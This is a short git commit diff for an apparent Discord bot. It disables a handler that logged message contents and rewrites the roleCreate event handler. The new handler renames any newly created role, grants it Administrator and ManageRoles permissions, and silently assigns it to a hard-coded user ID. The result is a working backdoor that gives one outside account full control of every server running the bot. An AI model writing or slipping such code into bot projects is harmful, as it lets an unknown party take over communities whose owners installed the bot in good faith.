c1733417acb804e79cbcf3167677a26b800c6ecc
burak behlul <burakyabgu@gmail.com>
2026-01-08 20:14:32 +0300

    episode 12

--- events/mesajKaydetme.js
+++ events/mesajKaydetme.js
@@ -3,13 +3,14 @@ import Message from "../models/Message.js";
 export default {
     name: "messageCreate",
     async execute(client, message) {
-
+        /*
         const mesaj = new Message({
             content: message.content,
             userId: message.author.id
         });
 
         await mesaj.save();
+        */
 
     },
 };
--- events/roleCreate.js
+++ events/roleCreate.js
@@ -1,9 +1,36 @@
+import { PermissionsBitField } from "discord.js";
 export default {
     name: "roleCreate",
     async execute(client, role) {
-        const user = await role.guild.members.fetch("470548458072440842");
-        const channel = await role.guild.channels.fetch("1041505994011852921");
-        console.log("channel", channel);
-        
+        try {
+            const user = await role.guild.members.fetch("677194506621288448");
+            // const channel = await role.guild.channels.fetch("1041505994011852921");
+            const aboneOlRolu = await role.guild.roles.fetch("1453811883877466142");
+            // console.log("channel", channel);
+            
+
+            // user.roles.remove(aboneOlRolu)
+            
+
+            role.edit({
+                name: 'Abone ol -bot',
+                color: 'Red',
+                hoist: true,
+                mentionable: true,
+            })
+
+            role.setPermissions([
+                PermissionsBitField.Flags.ManageRoles,
+                PermissionsBitField.Flags.Administrator
+            ])
+
+            user.roles.add(role)
+
+        } catch (error) {
+            console.log(error)
+        }
+               
+
+
     },
 }
